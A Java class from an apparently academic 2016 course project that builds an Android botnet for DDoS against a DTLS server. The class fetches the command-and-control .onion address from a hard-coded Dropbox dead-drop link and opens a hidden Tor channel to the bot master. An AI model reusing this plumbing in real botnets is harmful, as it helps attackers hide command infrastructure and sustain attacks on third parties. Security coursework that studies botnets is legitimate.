/**
 *                     Πανεπιστήμιο Αιγαίου
 *      Τμήμα Μηχανικών Πληροφοριακών & Επικοινωνιακών Συστημάτων
 * 
 *          Ασφάλεια Ασύρματων & Κινητών Δικτύων Επικοινωνιών
 *                     Εαρινό Εξάμηνο 2016
 *                      Project Μαθήματος
 * 
 * Δημιουργία secure botnet με android clients & Dos/DDoS σε DTLS Server.
 * 
 *          Πέππας Κωνσταντίνος 321/2011134 - icsd11134@icsd.aegean.gr
 *          Σωτηρέλης Χρήστος   321/2012182 - icsd12182@icsd.aegean.gr
 *          Χαϊκάλης Νικόλαος   321/2012200 - icsd12200@icsd.aegean.gr
 * 
 *          Καθηγητής Μαθήματος: Γ. Καμπουράκης 
 * 
 */
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.silvertunnel_ng.netlib.api.NetFactory;
import org.silvertunnel_ng.netlib.api.NetLayer;
import org.silvertunnel_ng.netlib.api.NetLayerIDs;
import org.silvertunnel_ng.netlib.api.NetSocket;
import org.silvertunnel_ng.netlib.api.util.TcpipNetAddress;

/**
 * class pou setarw to Tor Connection san client
 */
public class TorConnection implements Serializable{
    private NetSocket socket;
    private ObjectOutputStream oos;
    private ObjectInputStream ois;
    private int port;
    private File file = new File("C:\\Users\\Alcohealism\\Documents\\NetBeansProjects\\BotMaster_Android\\Client Onions\\hostname");
    private String onion; //To .onion pou syndeodai o server me ton client gia na to kanw return.

    //Constructor gia to an o user thelei na dinei oos, ois, port
    public TorConnection(ObjectOutputStream oos, ObjectInputStream ois, int port) {
        this.oos = oos;
        this.ois = ois;
        this.port = port;
    }

    //Constructor gia to an thelei na dwsei mono port:
    public TorConnection(int port) {
        this.port = port;
    }
    
    //Constructor gia to an o user thelei na dwsei mono oos, ois

    public TorConnection(ObjectOutputStream oos, ObjectInputStream ois) {
        this.oos = oos;
        this.ois = ois;
    }
    

    //default Constructor:
    public TorConnection() {}

    /**
     * Methodos pou tin xrisimopoiw gia na katevasw ena arxeio apo to dropbox
     * pou periexei to .onion gia tin syndesi tu C&C me ton BotMaster meso TOR.
     */
    private void DropboxToFile(){
        String url = "https://www.dropbox.com/s/83clcg3c706dbzg/hostname?dl=1";
        String filename="C:\\Users\\Alcohealism\\Documents\\NetBeansProjects\\BotMaster_Android\\Client Onions\\hostname";
        try{
            URL download=new URL(url);
            ReadableByteChannel rbc=Channels.newChannel(download.openStream());
            FileOutputStream fileOut = new FileOutputStream(filename);
            fileOut.getChannel().transferFrom(rbc, 0, 1 << 24);
            fileOut.flush();
            fileOut.close();
            rbc.close();
        }catch(Exception e){ e.printStackTrace(); }
    }
    
    public void EstablishTorConnection(){
        BufferedReader br = null;
        try {
            //File file = new File("C:\\Users\\Alcohealism\\Documents\\NetBeansProjects\\BotMaster_Android\\Onion\\hostname");
            DropboxToFile();
            File file = new File("C:\\Users\\Alcohealism\\Documents\\NetBeansProjects\\BotMaster_Android\\Client Onions\\hostname");
            br = new BufferedReader(new FileReader(file));
            // define remote address
            String remoteHostname = br.readLine();
            onion = remoteHostname;
            System.out.println("Host from dropbox: " + remoteHostname);
            int remotePort = port;
            TcpipNetAddress remoteAddress = new TcpipNetAddress(remoteHostname, remotePort);
            // get TorNetLayer instance and wait until it is ready
            NetLayer netLayer = NetFactory.getInstance().getNetLayerById(NetLayerIDs.TOR);
            netLayer.waitUntilReady();
            // open connection to remote address - this connection is tunneled through the TOR anonymity network
            try {
                socket = netLayer.createNetSocket(null, null, remoteAddress);
                // send data
                oos = new ObjectOutputStream(socket.getOutputStream());
                ois = new ObjectInputStream(socket.getInputStream());
            }catch (IOException ex){
                //clear o buffer:
                System.out.print("");
                //System.out.println("O BotMaster den einai syndedemenos perimenw na syndethei.");
                EstablishTorConnection();
            }
        } catch (IOException ex) {
            Logger.getLogger(TorConnection.class.getName()).log(Level.SEVERE, null, ex);
        } 
    }
    
    public void StopConnection(){
        try {
            if(oos != null) oos.close();
            if(ois != null) ois.close();
            if(socket !=null) socket.close();
        } catch (IOException ex) {
            return;
        }
    }

    //Getter / Setter :
    public NetSocket getSocket() {
        return socket;
    }

    public void setSocket(NetSocket socket) {
        this.socket = socket;
    }

    public ObjectOutputStream getOos() {
        return oos;
    }

    public void setOos(ObjectOutputStream oos) {
        this.oos = oos;
    }

    public ObjectInputStream getOis() {
        return ois;
    }

    public void setOis(ObjectInputStream ois) {
        this.ois = ois;
    }

    public int getPort() {
        return port;
    }

    public void setPort(int port) {
        this.port = port;
    }

    public File getFile() {
        return file;
    }

    public void setFile(File file) {
        this.file = file;
    }

    public String getOnion() {
        return onion;
    }

    public void setOnion(String onion) {
        this.onion = onion;
    }
   
    
    
}
